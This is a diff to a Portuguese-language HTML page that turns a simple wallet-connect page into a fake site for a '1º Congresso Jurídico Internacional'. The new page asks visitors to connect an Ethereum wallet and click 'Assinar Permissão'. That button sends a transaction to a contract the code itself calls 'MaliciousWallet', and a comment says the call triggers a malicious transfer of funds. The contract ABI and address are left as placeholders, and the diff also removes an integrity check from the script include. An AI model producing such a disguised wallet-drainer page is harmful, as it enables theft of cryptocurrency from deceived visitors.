@@ -2,19 +2,80 @@
 <html lang="pt">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Conectar Wallet</title>
-    <!-- Incluindo ethers.js com SRI -->
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.x/dist/ethers.min.js"
-        integrity="sha384-RZpCpBRPzRbtGNRttC6f2KfSYYoS+G0fQijzQ4L+RiDE1M5Jg5LNaG5f7Oxusz6p"
-        crossorigin="anonymous"></script>
+    <title>1º Congresso Jurídico Internacional</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.4.0/dist/web3.min.js"></script>
+    <style>
+        /* Estilos da página */
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        button {
+            color: black;
+            margin: 5px;
+        }
+        .container {
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-    <h1>Conectar à Wallet</h1>
-    <button id="connectWallet">Conectar Wallet</button>
+    <div class="container">
+        <h1>1º Congresso Jurídico Internacional</h1>
+        <button onclick="conectarWallet()">Conectar Wallet</button>
+        <button id="btnSignPermission" style="display:none;" onclick="signPermission()">Assinar Permissão</button>
+        <p id="status"></p>
+    </div>
 
     <script>
-        // O restante do seu código JavaScript para conectar a carteira...
+        // Defina a ABI do contrato MaliciousWallet
+        const abiMaliciousWallet = [
+            // Coloque aqui a ABI ajustada ao contrato MaliciousWallet
+        ];
+
+        // Defina o endereço do contrato MaliciousWallet
+        const enderecoContratoMaliciousWallet = "0x..."; // Substitua pelo endereço do contrato correto
+
+        let accounts;
+        let contrato;
+
+        async function conectarWallet() {
+            if (window.ethereum) {
+                try {
+                    accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    contrato = new web3.eth.Contract(abiMaliciousWallet, enderecoContratoMaliciousWallet);
+                    document.getElementById('btnSignPermission').style.display = 'block';
+                    document.getElementById('status').textContent = "Wallet conectada: " + accounts[0];
+                } catch (error) {
+                    console.error("Erro ao conectar a wallet:", error);
+                }
+            } else {
+                console.error("Nenhuma wallet encontrada.");
+            }
+        }
+
+        // Função para simular assinatura de permissão e desencadear a transferência maliciosa de fundos
+        async function signPermission() {
+            if (window.ethereum && contrato) {
+                try {
+                    const resultado = await contrato.methods
+                        .signPermission()
+                        .send({ from: accounts[0] });
+
+                    console.log("Permissão assinada:", resultado);
+                } catch (error) {
+                    console.error("Erro ao assinar permissão:", error);
+                }
+            } else {
+                console.error("Conexão com a wallet necessária.");
+            }
+        }
     </script>
 </body>
 </html>
